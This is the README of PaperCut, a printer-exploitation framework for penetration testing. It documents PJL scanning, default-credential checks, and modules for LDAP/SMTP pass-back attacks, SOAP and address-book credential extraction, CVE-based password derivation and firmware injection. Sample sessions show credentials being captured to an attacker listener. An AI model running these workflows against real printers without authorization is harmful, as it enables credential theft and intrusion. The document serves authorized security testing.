# PaperCut

Printer exploitation framework for penetration testing. Discovers printers via PJL scanning, checks for default credentials, and extracts stored credentials through pass-back attacks and protocol-level exploits.

The framework and core modules are complete, but community support is needed to expand coverage since writing and testing modules requires access to the actual devices. Please give it a star to help increase visibility for potential module contributions!

```
    $$$$$$$\                                          $$$$$$\              $$\
    $$  __$$\                                        $$  __$$\             $$ |
    $$ |  $$ |$$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  $$ /  \__|$$\   $$\ $$$$$$\
    $$$$$$$  |\____$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ |      $$ |  $$ |\_$$  _|
    $$  ____/ $$$$$$$ |$$ /  $$ |$$$$$$$$ |$$ |  \__|$$ |      $$ |  $$ |  $$ |
    $$ |     $$  __$$ |$$ |  $$ |$$   ____|$$ |      $$ |  $$\ $$ |  $$ |  $$ |$$\
    $$ |     \$$$$$$$ |$$$$$$$  |\$$$$$$$\ $$ |      \$$$$$$  |\$$$$$$  |  \$$$$  |
    \__|      \_______|$$  ____/  \_______|\__|       \______/  \______/    \____/
                       $$ |
                       $$ |    Printer Exploitation Framework
                       \__|    #Waffl3ss                 v0.7
  Type 'help' for available commands. Tab completion is available.

PaperCut > workspace create DEMO
[+] Workspace "DEMO" created and set as active
PaperCut [DEMO] > scan -t 10.0.0.10
[*] Scanning 1 target(s) with 20 workers (timeout: 2s)
[+] 10.0.0.10 -- RICOH MP C3004 (Ricoh)

[*] Scan complete. Found 1 printer(s) out of 1 target(s).
PaperCut [DEMO] > use ricoh/ldap/passback
[*] Using module: ricoh/ldap/passback
[*] RICOH LDAP Pass-Back - redirects LDAP test connection to capture bind credentials
[*] Category: SAFE | Manufacturer: Ricoh
[*] Models: MP C3003, MP C4503, MP C6003
PaperCut [DEMO] (ricoh/ldap/passback) SAFE >
``` 

> **Legal Disclaimer**: PaperCut is designed for authorized security testing and educational purposes only. Only use this tool against systems you own or have explicit written authorization to test. Unauthorized access to computer systems is illegal. The authors assume no liability for misuse of this software.

## Table of Contents

- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage](#usage)
  - [Interactive Mode](#interactive-mode)
  - [Module Workflow](#module-workflow)
  - [One-Shot CLI Mode](#one-shot-cli-mode)
- [Modules](#modules)
- [Scanner](#scanner)
- [Proxy Support](#proxy-support)
- [Scanning Large Networks](#scanning-large-networks)
- [Credential Storage](#credential-storage)
- [Writing New Modules](#writing-new-modules)
- [License](#license)

## Installation

Requires Go 1.24+.

```bash
git clone https://github.com/waffl3ss/PaperCut.git
cd PaperCut

# Build for current OS
make build

# Build for specific platforms
make linux       # papercut_linux
make windows     # papercut_windows.exe
make darwin      # papercut_darwin (amd64)
make darwin-arm  # papercut_darwin_arm64 (Apple Silicon)

# Build all platforms
make all
```

## Quick Start

```bash
# Launch interactive shell
./papercut

# Create a workspace and scan a network
papercut > workspace create engagement1
papercut [engagement1] > scan -t 10.0.0.0/24

# View results and search for modules
papercut [engagement1] > results
papercut [engagement1] > search ricoh

# Select a module and exploit
papercut [engagement1] > use 1
papercut [engagement1] (ricoh/ldap/passback) > set TARGET 1
papercut [engagement1] (ricoh/ldap/passback) > set LHOST 10.0.0.100
papercut [engagement1] (ricoh/ldap/passback) > check
papercut [engagement1] (ricoh/ldap/passback) > run

# View captured credentials
papercut [engagement1] > creds
```

## Usage

### Interactive Mode

```
./papercut
```

Launches the interactive shell with tab completion, command history, and a Metasploit-style workflow.

```
papercut > workspace create engagement1
[+] Workspace "engagement1" created and set as active

papercut [engagement1] > scan -t 10.0.0.0/24
[*] Scanning 254 target(s) with 20 workers (timeout: 2s)
[+] 10.0.0.5 -- RICOH MP C3004 (Ricoh)
[+] 10.0.0.12 -- HP LaserJet Pro M404dn (HP)
[+] 10.0.0.20 -- Sharp MX-2640N (Sharp)

papercut [engagement1] > results
papercut [engagement1] > results --manufacturer ricoh
papercut [engagement1] > search ricoh
papercut [engagement1] > set threads 100
papercut [engagement1] > show
```

### Module Workflow

Select a module, configure options, then check credentials or run the exploit:

```
papercut [engagement1] > search ricoh
╭───┬──────────────────────┬──────────┬──────────────┬─────────────────────┬──────────────────────╮
│ # │ Name                 │ Category │ Manufacturer │ Models              │ Description          │
├───┼──────────────────────┼──────────┼──────────────┼─────────────────────┼──────────────────────┤
│ 1 │ ricoh/ldap/passback  │ SAFE     │ Ricoh        │ MP C3003, MP C4503  │ RICOH LDAP Pass-Back │
╰───┴──────────────────────┴──────────┴──────────────┴─────────────────────┴──────────────────────╯

papercut [engagement1] > use 1
[*] Using module: ricoh/ldap/passback

papercut [engagement1] (ricoh/ldap/passback) > options
╭──────────┬─────────┬──────────┬────────────────────────────────────╮
│ NAME     │ CURRENT │ REQUIRED │ DESCRIPTION                        │
├──────────┼─────────┼──────────┼────────────────────────────────────┤
│ RHOST    │         │ yes      │ Target IP address                  │
│ RPORT    │ 80      │ no       │ Target HTTP port                   │
│ LHOST    │         │ yes      │ Listening IP for LDAP callback     │
│ LPORT    │ 389     │ no       │ Listening port for LDAP callback   │
│ USERNAME │ admin   │ no       │ Login username                     │
│ PASSWORD │         │ no       │ Login password (empty for default) │
│ SSL      │ false   │ no       │ Use HTTPS                          │
│ VERBOSE  │ false   │ no       │ Verbose output                     │
│ TIMEOUT  │ 120     │ no       │ Callback timeout in seconds        │
│ PROXY    │         │ no       │ Proxy (overrides global)           │
╰──────────┴─────────┴──────────┴────────────────────────────────────╯

papercut [engagement1] (ricoh/ldap/passback) > set TARGET 1
[*] TARGET 1 => 10.0.0.5 (Ricoh RICOH MP C3004)

papercut [engagement1] (ricoh/ldap/passback) > set LHOST 10.0.0.100

papercut [engagement1] (ricoh/ldap/passback) > check
[*] Checking default credentials on 10.0.0.5:80...
[+] Default credentials valid: admin/(empty)

papercut [engagement1] (ricoh/ldap/passback) > run
[*] Logging into 10.0.0.5:80 as admin...
[+] Login successful
[*] Extracting LDAP configuration...
[*] Starting LDAP listener on 10.0.0.100:389...
[*] Redirecting LDAP test to 10.0.0.100:389...
[*] Waiting for callback (timeout: 120s)...
[+] Received LDAP bind from 10.0.0.5
[+] Username: cn=ldap_user,dc=corp,dc=local
[+] Password: LdapP@ssw0rd!

papercut [engagement1] (ricoh/ldap/passback) > back
```

When a module is active:
- **UPPERCASE** option names set module options: `set RHOST 10.0.0.5`
- **lowercase** option names set global settings: `set threads 50`
- **`set TARGET <n>`** fills RHOST from the scan results table row number

### One-Shot CLI Mode

Most commands also work as direct CLI invocations with flags. The interactive shell is the primary interface and is more thoroughly tested - one-shot mode is provided as a convenience but may not cover all workflows.

```bash
./papercut scan -t 10.0.0.0/24 -w engagement1
./papercut check -t 10.0.0.5 -m ricoh/ldap/passback -w engagement1
./papercut results -w engagement1
```

### Target Input Formats

The `-t` flag accepts:
- Single IP: `10.0.0.1`
- CIDR notation: `10.0.0.0/24`, `172.16.0.0/16`, `10.0.0.0/8`
- File: path to a text file with one target per line (supports IPs, CIDRs, and hostnames)
- Hostname: `printer.corp.local`

### Interactive Commands

| Command | Description |
|---|---|
| `scan -t <target>` | Scan targets via PJL on port 9100 |
| `search <term>` | Search modules (case-insensitive, searches name/description/manufacturer/models) |
| `use <module\|number>` | Select a module by name or search result number |
| `options` | Show options for the active module |
| `set <OPTION> <value>` | Set module option (when module active) |
| `set TARGET <n>` | Set RHOST from results table row number |
| `check` | Test default credentials (module context) |
| `run` | Execute the active module's exploit |
| `back` | Deselect the current module |
| `results` | Show scan results for active workspace |
| `results --manufacturer <name>` | Filter results by manufacturer |
| `results -c` | Show only hosts with confirmed default credentials |
| `creds` | Show captured credentials from exploits |
| `workspace create <name>` | Create a new workspace |
| `workspace use <name>` | Switch to a workspace |
| `workspace list` | List all workspaces |
| `workspace delete <name>` | Delete a workspace and its data |
| `workspace info` | Show active workspace details |
| `set <option> <value>` | Set global: threads, timeout, rate, proxy |
| `show` | Show current global settings |
| `banner` | Display the banner |
| `clear` | Clear the screen |
| `help` | Show help |
| `exit` / `quit` | Exit |

### Settings

| Option | Default | Description |
|---|---|---|
| `threads` | 20 | Number of concurrent worker goroutines |
| `timeout` | 2s | TCP connection timeout per host |
| `rate` | 0 (unlimited) | Max new connections per second |
| `proxy` | (none) | SOCKS proxy for connections (socks5://host:port) |

## Modules

Modules are categorized as **SAFE** or **UNSAFE**:
- **SAFE** - Restores the device to its original state after execution. Read-only extraction, test connections, and temporary config changes that are reverted.
- **UNSAFE** - May leave changes on the device. Settings are modified during exploitation and restored on a best-effort basis.

Each module has two phases:
- **Check** - Tests for default credentials or vulnerable configurations (non-destructive)
- **Exploit** - Performs the attack: pass-back, credential extraction, address book dump, etc.

### Available Modules

| Module | Category | Technique | Targets |
|---|---|---|---|
| `ricoh/ldap/passback` | SAFE | LDAP pass-back via test connection | Ricoh MP C3003, C4503, C6003 |
| `konica/soap/pwd_extract` | SAFE | SOAP API credential extraction | Konica Minolta C224, C280, C353, C452, C554, and more |
| `sharp/smtp/mx2640_passback` | SAFE | SMTP/POP3 pass-back via test button | Sharp MX-2640N |
| `sharp/smtp/mxb468_passback` | UNSAFE | SMTP pass-back via webglue API | Sharp MX-B468F |
| `canon/http/pwd_extract` | SAFE | LDIF address book export | Canon iR-ADV C2030, C5030, C5235, C7065, and more |
| `brother/http/default_pwd` | SAFE | CVE-2024-51977/51978 serial-based password derivation | 689+ Brother models |
| `kyocera/soap/addr_book_extract` | SAFE | CVE-2022-1026 unauthenticated SOAP extraction | Kyocera ECOSYS, TASKalfa series |
| `xerox/ldap/workcentre_passback` | SAFE | LDAP pass-back via config modification | Xerox WorkCentre 5735, 5740, 5745, 5755 |
| `xerox/pjl/pwd_extract` | UNSAFE | DLM firmware injection for password extraction | Xerox WorkCentre 5735, 5745, 5755, 5765, 5775 |

Use `search` to discover modules by name, manufacturer, technique, or compatible printer model:

```
papercut > search sharp
papercut > search passback
papercut > search MX-2640
papercut > search CVE-2022
```

### Module Techniques

**Pass-Back Attacks** - Redirect a printer's outbound test connection (LDAP, SMTP, FTP) to an attacker-controlled listener that captures authentication credentials. The printer thinks it's testing connectivity; we capture the bind/auth credentials it sends.

**Credential Extraction** - Query printer APIs (SOAP, HTTP, LDIF) to directly extract stored credentials like SMB shares, FTP servers, email accounts, and address books.

**Password Derivation** - Exploit deterministic password generation (e.g., Brother devices where the admin password is derived from the serial number) to gain authenticated access.

## Scanner

PaperCut identifies printers by connecting to port 9100 (JetDirect/PJL) and sending:
- `@PJL INFO ID` - Returns the printer model string
- `@PJL INFO STATUS` - Returns online/offline status

The model string is matched against known manufacturers: HP, Ricoh, Xerox, Sharp, Brother, Canon, Lexmark, Konica Minolta, Kyocera, Epson, Samsung, Dell, Toshiba, OKI.

Non-printer services on port 9100 (HTTP servers, SSH, SMTP, etc.) are automatically filtered out.

## Proxy Support

PaperCut supports routing traffic through SOCKS proxies:

```
papercut > set proxy socks5://127.0.0.1:1080
papercut > set proxy socks4://127.0.0.1:1080
```

- **Scanner**: SOCKS4/4a/5 for raw TCP PJL connections
- **Modules**: SOCKS4/4a/5 and HTTP/HTTPS proxies for HTTP-based exploits
- Bare `host:port` defaults to SOCKS5
- Per-module PROXY option available; global proxy takes precedence when set

To clear: `set proxy none`

## Scanning Large Networks

For networks larger than a /16 (65,534+ hosts), PaperCut displays estimated scan times and asks for confirmation:

```
[!] Large network detected. Estimated scan times:

    Profile              Threads    Timeout    Hosts/sec       Est. Time
    -------              -------    -------    ---------       ---------
    Current settings     20         2s         ~10             19.4 days
    Recommended          100        2s         ~50             3.9 days
    Aggressive           200        1s         ~200            23.3h
    Max speed            500        1s         ~500            9.3h

[*] Tune with: set threads <n> / set timeout <n>

Continue? [y/N]
```

Default is No - pressing Enter cancels so you can adjust settings first.

Resource impact is minimal regardless of network size:
- **RAM**: Flat ~few MB. IPs are streamed lazily, never all loaded into memory.
- **CPU**: Negligible. Workers block on network I/O.
- **Bandwidth**: Each probe is ~84 bytes. Dead hosts just timeout or RST.

## Credential Storage

All data is stored locally in `~/.PaperCut/`:
- `papercut.db` - SQLite database (workspaces, scan results, check results, exploit results)
- `history` - Command history for the interactive shell

Workspaces isolate data per engagement - credentials from one workspace are never visible in another. The `creds` command shows credentials captured in the active workspace:

```
papercut [engagement1] > creds
╭─────────────┬──────┬──────────────────────────────┬───────────────┬─────────────────────────────┬──────────╮
│ HOST        │ PORT │ USERNAME                     │ PASSWORD      │ MODULE                      │ PROTOCOL │
├─────────────┼──────┼──────────────────────────────┼───────────────┼─────────────────────────────┼──────────┤
│ 10.0.0.5    │ 80   │ cn=ldap_user,dc=corp,dc=local│ LdapP@ssw0rd! │ ricoh/ldap/passback         │ LDAP     │
│ 10.0.0.20   │ 80   │ smtp_user                    │ SmtpPass123   │ sharp/smtp/mx2640_passback  │ SMTP     │
│ 10.0.0.30   │ 50001│ admin                        │ P@ssw0rd      │ konica/soap/pwd_extract     │ SMB      │
╰─────────────┴──────┴──────────────────────────────┴───────────────┴─────────────────────────────┴──────────╯
```

Multi-credential modules (Konica SMB+FTP, Sharp POP3+SMTP) automatically expand to multiple rows.

## Writing New Modules

PaperCut's module system is designed for easy contribution. Each module is a single `.go` file that auto-registers itself - no other files need editing.

A heavily commented template is provided at `internal/modules/safe/template.go.example`.

### Step 1: Copy the template

```bash
cp internal/modules/safe/template.go.example internal/modules/safe/your_module.go
```

For UNSAFE modules, copy to `internal/modules/unsafe/` instead.

### Step 2: Implement your module

Edit the new file:

1. **Rename** the struct and constructor (`TemplateModule` -> `YourModule`, `NewTemplateModule` -> `NewYourModule`)
2. **Fill in metadata**: Name, Description, Manufacturer, Category, Authors, Tags, Models
3. **Define options** using UPPERCASE names (the shell routes `set UPPERCASE` to module options)
4. **Implement `Check()`** - test if the target is vulnerable or accepts default credentials
5. **Implement `Exploit()`** - perform the attack and return captured data in `ExploitResult.Data`

Module names follow the convention `manufacturer/method/module_name`:
```
ricoh/ldap/passback
konica/soap/pwd_extract
sharp/smtp/mx2640_passback
```

Standard options most modules should include:

| Option | Description |
|---|---|
| `RHOST` | Target IP (required) |
| `RPORT` | Target port (with a sensible default) |
| `USERNAME` / `PASSWORD` | Default credentials to try |
| `SSL` | Toggle HTTP vs HTTPS (default `false`) |
| `VERBOSE` | Extra debug output (default `false`) |
| `TIMEOUT` | Request/callback timeout in seconds |
| `PROXY` | Per-module proxy override |
| `LHOST` / `LPORT` | Listener address for pass-back modules |

### Step 3: Auto-registration

The module auto-registers via `init()`. The template includes this at the bottom:

```go
func init() {
    register(func() modules.ExploitModule { return NewYourModule() })
}
```

The `register()` function is provided by the package's `register.go` file. When your module is in `internal/modules/safe/`, it uses `safe.register()`. When in `unsafe/`, it uses `unsafe.register()`. No manual editing of `register.go` is required.

At startup, `RegisterAll()` iterates all collected factories and registers them with the module registry automatically.

### Step 4: Build and test

```bash
make build
./papercut
papercut > search your_module
papercut > use 1
papercut (manufacturer/method/your_module) > options
```

### Step 5: Submit

Submit a pull request and get it merged into the project!

### Conventions

- **SAFE** modules must not permanently modify device settings
- **UNSAFE** modules should restore settings on a best-effort basis
- Verbose output uses 2-space indentation: `output.Info("  Detail...")` to visually separate debug from primary status
- For pass-back attacks, use the listener package (`internal/listener/`) - the template includes a full example
- For HTTP clients, use `modules.NewHTTPTransport(proxy)` which handles legacy TLS, self-signed certs, and proxy routing
- Return `modules.ErrNotSupported` from `Check()` or `Exploit()` if your module doesn't support one phase

The template file contains inline comments explaining every section in detail.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
